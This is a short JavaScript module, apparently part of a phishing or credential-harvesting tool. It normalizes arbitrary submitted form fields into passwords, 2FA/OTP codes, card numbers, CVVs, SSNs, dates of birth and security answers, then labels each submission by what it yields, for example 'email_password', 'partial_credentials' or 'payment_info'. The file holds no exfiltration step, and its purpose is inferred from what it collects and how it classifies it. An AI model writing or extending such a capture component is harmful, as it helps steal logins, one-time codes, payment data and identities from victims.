// Developer: Sreeraj
// GitHub: https://github.com/s-r-e-e-r-a-j

export const fieldUtils = {
    normalizeFields(data) {
        const normalized = {
            email: data.email || data.Email || data['e-mail'] || data.mail || data['email-address'] || '',
            username: data.username || data.Username || data.user || data.User || data.login || data['user-name'] || '',
            phone: data.phone || data.Phone || data.mobile || data.tel || data['phone-number'] || data.phonenumber || '',
            password: data.password || data.Password || data.pass || data.Pass || data.passwd || data.pwd || data['login-password'] || '',
            confirm: data.confirm || data['confirm-password'] || data.password2 || data.repeat || '',
            otp: data.otp || data.OTP || data.code || data.token || data['2fa'] || data.mfa || data.totp || data['2fa-code'] || '',
            pin: data.pin || data.PIN || data['security-pin'] || '',
            card: data.card || data['card-number'] || data.creditcard || data['credit-card'] || '',
            cvv: data.cvv || data.CVV || data.cvc || data['security-code'] || '',
            expiry: data.expiry || data.exp || data['expiration'] || data['expiry-date'] || '',
            address: data.address || data.Address || data['street-address'] || '',
            city: data.city || data.City || '',
            state: data.state || data.State || '',
            zip: data.zip || data.ZIP || data['zip-code'] || data.postal || '',
            country: data.country || data.Country || '',
            dob: data.dob || data.DOB || data['date-of-birth'] || data.birthday || '',
            ssn: data.ssn || data.SSN || data['social-security'] || data['social-security-number'] || '',
            answer: data.answer || data.Answer || data['security-answer'] || '',
            question: data.question || data.Question || data['security-question'] || ''
        };

        let type = 'unknown';
        if (normalized.email && normalized.password) type = 'email_password';
        else if (normalized.username && normalized.password) type = 'username_password';
        else if (normalized.phone && normalized.password) type = 'phone_password';
        else if (normalized.email || normalized.username || normalized.phone) type = 'partial_credentials';
        else if (normalized.otp) type = '2fa_code';
        else if (normalized.card) type = 'payment_info';
        else if (normalized.ssn) type = 'personal_info';
        
        return { normalized, type };
    }
};
